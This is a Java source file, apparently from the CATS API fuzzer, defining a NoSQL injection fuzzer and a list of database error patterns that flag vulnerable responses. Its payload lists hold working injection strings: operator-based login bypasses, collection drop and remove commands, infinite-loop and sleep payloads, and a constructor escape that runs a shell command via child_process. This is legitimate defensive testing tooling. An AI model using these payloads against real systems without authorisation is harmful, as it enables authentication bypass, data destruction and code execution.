package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.List;

/**
 * Fuzzer that sends NoSQL injection payloads in string fields.
 * <p>
 * This fuzzer tests for NoSQL injection vulnerabilities (MongoDB, CouchDB, etc.)
 * by sending common NoSQL injection payloads and analyzing the response for
 * database error messages or other indicators of successful injection.
 * </p>
 */
@Singleton
@FieldFuzzer
public class NoSqlInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {

    private static final List<String> TOP_NOSQL_INJECTION_PAYLOADS = List.of(
            "' || '1'=='1",
            "{\"$gt\": \"\"}",
            "{\"$ne\": \"\"}",
            "{\"$where\": \"1==1\"}",
            "{\"$regex\": \".*\"}",
            "[$ne]=1",
            "{ $where: function() { return true; } }",
            "'; db.users.drop(); var foo='",
            "{\"$or\": [{}, {\"foo\": \"bar\"}]}",
            "admin' && this.password.match(/.*/)//+%00"
    );

    private static final List<String> ALL_NOSQL_INJECTION_PAYLOADS = List.of(
            "' || '1'=='1",
            "'; return true; var foo='",
            "'; return this.password; var foo='",
            "{\"$gt\": \"\"}",
            "{\"$ne\": \"\"}",
            "{\"$ne\": null}",
            "{\"$gt\": undefined}",
            "{\"$where\": \"1==1\"}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$regex\": \".*\"}",
            "{\"$regex\": \"^a\"}",
            "[$ne]=1",
            "[$gt]=",
            "[$regex]=.*",
            "true, $where: '1 == 1'",
            "', $where: '1 == 1'",
            "1, $where: '1 == 1'",
            "{ $where: function() { return true; } }",
            "{ $gt: '' }",
            "{ $ne: 1 }",
            "'; sleep(5000); var foo='",
            "'; while(true){}; var foo='",
            "{\"$or\": [{}, {\"foo\": \"bar\"}]}",
            "{\"$and\": [{}, {\"foo\": \"bar\"}]}",
            "this.constructor.constructor(\"return this\")().process.mainModule.require('child_process').execSync('ls')",
            "db.users.find({$where: function() { return true; }})",
            "'; db.users.drop(); var foo='",
            "'; db.users.remove({}); var foo='",
            "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
            "admin' && this.password.match(/.*/)//+%00",
            "admin' && this.password%00"
    );

    private static final List<String> NOSQL_ERROR_PATTERNS = List.of(
            "mongodb",
            "mongo",
            "mongoose",
            "couchdb",
            "couchbase",
            "redis",
            "cassandra",
            "dynamodb",
            "elasticsearchexception",
            "documentdb",
            "cosmosdb",
            "arangodb",
            "neo4j",
            "orientdb",
            "rethinkdb",
            "bson",
            "objectid",
            "$where",
            "$regex",
            "$gt",
            "$lt",
            "$ne",
            "$or",
            "$and",
            "json parse error",
            "json parsing error",
            "unexpected token",
            "syntaxerror",
            "cannot read property",
            "undefined is not",
            "invalid operator",
            "unknown operator",
            "bad query",
            "query error",
            "invalid query",
            "command failed",
            "errmsg",
            "writeresult",
            "writeconcernerror"
    );

    /**
     * Creates a new NoSqlInjectionInStringFieldsFuzzer instance.
     *
     * @param simpleExecutor          the executor used to run the fuzz logic
     * @param testCaseListener        the test case listener for reporting results
     * @param securityFuzzerArguments the security fuzzer arguments
     */
    public NoSqlInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                              SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "NoSQL";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_NOSQL_INJECTION_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_NOSQL_INJECTION_PAYLOADS;
    }

    @Override
    protected List<String> getErrorPatterns() {
        return NOSQL_ERROR_PATTERNS;
    }

    @Override
    public String description() {
        return "iterate through each string field and send NoSQL injection payloads to detect NoSQL injection vulnerabilities";
    }
}
